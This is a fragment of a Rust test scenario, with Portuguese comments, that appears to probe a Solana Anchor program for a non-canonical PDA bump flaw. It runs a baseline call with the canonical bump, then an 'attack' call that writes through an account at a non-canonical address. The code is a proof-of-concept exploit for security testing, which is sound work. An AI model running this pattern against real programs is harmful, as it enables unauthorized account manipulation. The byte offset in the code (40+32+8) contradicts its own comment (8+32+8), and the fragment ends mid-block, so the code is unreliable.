  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Encontrar um bump nao canonico (menor que o canonico) para o qual create_program_address retorna Ok
let mut non_canonical_bump = canonical_bump - 1;
let mut non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
while non_canonical_pda.is_err() && non_canonical_bump > 0 {
    non_canonical_bump -= 1;
    non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
}
let non_canonical_pda = non_canonical_pda.unwrap();

// Conta DataAccount no endereco canonico (para baseline)
let data_account_canonical = account(
    &env.program_id,
    &anchor_account_data("DataAccount", &(user, 0u64, canonical_bump)),
    None,
);

// Conta DataAccount no endereco nao canonico (para ataque)
let data_account_non_canonical = account(
    &env.program_id,
    &anchor_account_data("DataAccount", &(user, 0u64, non_canonical_bump)),
    None,
);

let user_account = wallet(1_000_000_000);

// Baseline: chamada legitima com bump canonico
let ix_baseline = env.anchor_ix(
    "set_value",
    &(canonical_bump, 42u64),
    vec![
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let contas_baseline = vec![
    (canonical_pda, data_account_canonical),
    (user, user_account.clone()),
];
let r_baseline = env.baseline("set_value com bump canonico", &ix_baseline, &contas_baseline);

// Ataque: mesmo user, mas bump nao canonico e conta no endereco correspondente
let ix_attack = env.anchor_ix(
    "set_value",
    &(non_canonical_bump, 99u64),
    vec![
        AccountMeta::new(non_canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let contas_attack = vec![
    (non_canonical_pda, data_account_non_canonical),
    (user, user_account),
];
let r_attack = env.attack("set_value com bump nao canonico", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let data_after = after(&r_attack, &non_canonical_pda);
    let bump_gravado = data_after.data()[40 + 32 + 8]; // offset: disc(8) + user(32) + value(8)
    env.effect(
        "conta aceita em endereco nao canonico e bump gravado e o nao canonico",
        non_canonical_pda != canonical_pda && bump_gravado == non_canonical_bump,
    );
